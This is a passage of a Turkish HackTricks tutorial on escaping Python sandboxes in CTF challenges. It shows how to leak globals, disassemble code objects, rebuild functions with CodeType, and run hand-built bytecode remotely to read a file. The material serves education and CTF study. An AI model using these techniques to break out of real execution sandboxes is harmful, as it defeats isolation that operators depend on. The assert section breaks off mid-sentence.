{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Daha fazla yer için buraya bakın**](./#globals-and-locals)

### **Fonksiyon koduna erişim**

**`__code__`** ve `func_code`: Fonksiyonun bu **özelliğine erişebilirsiniz** ve fonksiyonun **kod nesnesini elde edebilirsiniz**.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### Kod Bilgisi Almak

Python kodunu çalıştırmadan önce, kodun içeriğini ve davranışını anlamak önemlidir. Bu, kodun ne yapabileceğini ve potansiyel güvenlik risklerini belirlemek için gereklidir. İşte kod hakkında bilgi edinmenin bazı yolları:

- **Kodun İçeriğini İnceleme**: Kodu dikkatlice okuyun ve ne yaptığını anlamaya çalışın. Değişkenlerin nasıl kullanıldığını, döngülerin ve koşullu ifadelerin nasıl çalıştığını anlamak önemlidir.

- **Dökümantasyonu Okuma**: Kodun dökümantasyonunu okuyun. Bu, kodun nasıl kullanılması gerektiği, hangi parametrelerin kabul edildiği ve hangi çıktıların döndürüldüğü gibi bilgileri içerebilir.

- **Modül ve Fonksiyonlar Hakkında Bilgi Edinme**: Kullanılan modüllerin ve fonksiyonların belgelerini okuyun. Bu, modül veya fonksiyonun ne yaptığı, hangi parametreleri kabul ettiği ve hangi çıktıları döndürdüğü gibi bilgileri içerebilir.

- **Kodun İzini Sürme**: Kodu izlemek için print ifadeleri ekleyebilirsiniz. Bu, kodun hangi adımları izlediğini ve hangi değerleri kullandığını gösterir.

- **Kodun Analizi**: Kodu statik analiz araçlarıyla inceleyebilirsiniz. Bu araçlar, kodun potansiyel güvenlik açıklarını tespit etmek için kullanılabilir.

Kod hakkında bilgi edinmek, kodun potansiyel risklerini belirlemek ve güvenlik açıklarını tespit etmek için önemlidir. Bu bilgiler, kodu güvenli bir şekilde çalıştırmak veya potansiyel riskleri önlemek için kullanılabilir.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **Bir fonksiyonu disassemble etmek**

Bir Python fonksiyonunu disassemble etmek, fonksiyonun altında yatan makine kodunu incelemek için kullanılan bir tekniktir. Bu, fonksiyonun nasıl çalıştığını ve hangi adımları izlediğini anlamak için faydalı olabilir.

Python'da, `dis` modülü bu işlemi gerçekleştirmek için kullanılır. Bu modül, Python bytecode'unu okuyarak ve çözerek fonksiyonun adımlarını gösteren bir çıktı sağlar.

Aşağıda, bir fonksiyonu nasıl disassemble edeceğinizi gösteren bir örnek bulunmaktadır:

```python
import dis

def my_function():
    x = 5
    y = 10
    z = x + y
    print(z)

dis.dis(my_function)
```

Bu kodu çalıştırdığınızda, `my_function` fonksiyonunun disassembled çıktısını alırsınız. Bu çıktı, fonksiyonun her bir adımını ve ilgili bytecode'u gösterir.

Disassembled çıktı, fonksiyonun altında yatan işlem mantığını anlamak için kullanılabilir. Özellikle, bir fonksiyonun nasıl çalıştığını anlamak veya bir sandık veya güvenlik mekanizması tarafından korunan bir fonksiyonu incelemek için faydalı olabilir.
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
Eğer python kum havuzunda `dis` modülünü içe aktaramazsanız, fonksiyonun **bytecode**'unu (`get_flag.func_code.co_code`) elde edebilir ve yerel olarak **ayrıştırabilirsiniz**. Yüklenen değişkenlerin içeriğini (`LOAD_CONST`) görmeyeceksiniz, ancak `LOAD_CONST` değişkenin yüklenme ofsetini de belirttiği için bunları (`get_flag.func_code.co_consts`) tahmin edebilirsiniz.
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Python Derleme

Şimdi, bir şekilde **çalıştıramadığınız bir işlev hakkında bilgi alabilirsiniz**, ancak onu **çalıştırmanız gerekiyorsa** ne yapacağınızı bilmiyorsunuz.\
Aşağıdaki örnekte olduğu gibi, o işlevin **kod nesnesine erişebilirsiniz**, ancak disassemble'ı okuyarak **bayrağı nasıl hesaplayacağınızı bilmezsiniz** (_daha karmaşık bir `calc_flag` işlevini hayal edin_).
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Kod nesnesi oluşturma

İlk olarak, **bir kod nesnesi oluşturmayı ve çalıştırmayı** nasıl yapacağımızı bilmemiz gerekiyor, böylece sızdırılan fonksiyonumuzu çalıştırmak için bir tane oluşturabiliriz:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
{% hint style="info" %}
Python sürümüne bağlı olarak `code_type`'ın **parametreleri** farklı bir **sıraya** sahip olabilir. Çalıştırdığınız python sürümündeki parametre sırasını öğrenmenin en iyi yolu şudur:
```
import types
types.CodeType.__doc__
'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
```
{% endhint %}

### Sızdırılan bir fonksiyonun yeniden oluşturulması

{% hint style="warning" %}
Aşağıdaki örnekte, fonksiyonu doğrudan fonksiyon kodu nesnesinden yeniden oluşturmak için gereken tüm verileri alacağız. **Gerçek bir örnekte**, fonksiyonu yürütmek için gereken tüm **değerler**, **sızdırmanız gereken şeydir**.
{% endhint %}
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Savunmaları Aşma

Bu yazının başında verilen örneklerde, `compile` fonksiyonunu kullanarak herhangi bir Python kodunu nasıl çalıştıracağınızı görebilirsiniz. Bu ilginç çünkü bir **tek satırda** döngüler ve her şeyi içeren **tüm betikleri** çalıştırabilirsiniz (aynısını **`exec`** kullanarak da yapabilirdik).\
Neyse ki, bazen yerel bir makinede bir **derlenmiş nesne** oluşturup onu **CTF makinesinde** çalıştırmak faydalı olabilir (örneğin, CTF'de `compile` fonksiyonuna sahip değilsek).

Örneğin, _./poc.py_ dosyasını okuyan ve derleyen bir işlevi manuel olarak derleyip çalıştıralım:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Eğer `eval` veya `exec`'e erişim sağlayamıyorsanız, bir **uygun fonksiyon** oluşturabilirsiniz, ancak bunu doğrudan çağırmak genellikle _sınırlı modda erişilemez yapılandırıcı_ hatasıyla sonuçlanacaktır. Bu nedenle, bu fonksiyonu çağırmak için **sınırlı ortamda olmayan bir fonksiyona ihtiyacınız vardır.**
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Derlenmiş Python Kodunu Geri Dönüştürme

[**https://www.decompiler.com/**](https://www.decompiler.com) gibi araçlar kullanılarak, derlenmiş Python kodu geri dönüştürülebilir.

Bu öğreticiye göz atın:

{% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
[.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
{% endcontent-ref %}

## Misc Python

### Assert

Python, `-O` parametresiyle optimize edildiğinde, **debug** değerine bağlı olarak yapılan asset ifadelerini ve herhangi bir koşula bağlı olan kodu kaldırır.\
Bu nedenle, aşağıdaki gibi kontrol ifadeleri kullanmak yerine,
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
## Referanslar

* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python\_sandbox\_escape)
* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>
